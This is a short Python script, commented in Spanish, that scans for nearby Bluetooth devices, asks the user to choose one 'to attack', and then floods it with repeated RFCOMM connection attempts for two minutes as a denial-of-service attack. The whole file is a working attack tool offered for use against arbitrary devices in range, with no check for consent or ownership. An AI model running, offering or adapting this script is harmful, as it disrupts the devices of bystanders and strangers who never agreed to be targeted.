import bluetooth
import time
import string

def discover_devices():
    print("Buscando dispositivos Bluetooth cercanos...")
    devices = bluetooth.discover_devices(duration=8, lookup_names=True, flush_cache=True, lookup_class=False)
    if devices:
        print("Dispositivos encontrados:")
        device_dict = {}
        for idx, (addr, name) in enumerate(devices):
            letter = string.ascii_uppercase[idx]
            device_dict[letter] = (addr, name)
            print(f"{letter}: {name} - {addr}")
        return device_dict
    else:
        print("No se encontraron dispositivos Bluetooth.")
        return None

def dos_attack(mac_address, duration=120, interval=0.1):
    """
    Ejecuta un ataque de denegación de servicio (DoS) a un dispositivo Bluetooth.
    
    :param mac_address: Dirección MAC del dispositivo Bluetooth
    :param duration: Duración del ataque en segundos
    :param interval: Intervalo entre solicitudes en segundos
    """
    end_time = time.time() + duration
    print(f"Iniciando ataque DoS al dispositivo {mac_address} por {duration} segundos...")
    
    while time.time() < end_time:
        try:
            # Intenta conectarse al dispositivo Bluetooth
            sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
            sock.connect((mac_address, 1))
            sock.close()
        except bluetooth.btcommon.BluetoothError as err:
            # Ignora los errores de conexión
            pass
        time.sleep(interval)
    
    print("Ataque DoS finalizado.")

if __name__ == "__main__":
    devices = discover_devices()
    if devices:
        choice = input("Selecciona un dispositivo para atacar (letra): ").upper()
        if choice in devices:
            target_mac_address = devices[choice][0]
            # Duración del ataque en segundos
            attack_duration = 120
            # Intervalo entre solicitudes en segundos
            attack_interval = 0.1
            # Ejecutar el ataque
            dos_attack(target_mac_address, attack_duration, attack_interval)
        else:
            print("Selección inválida.")
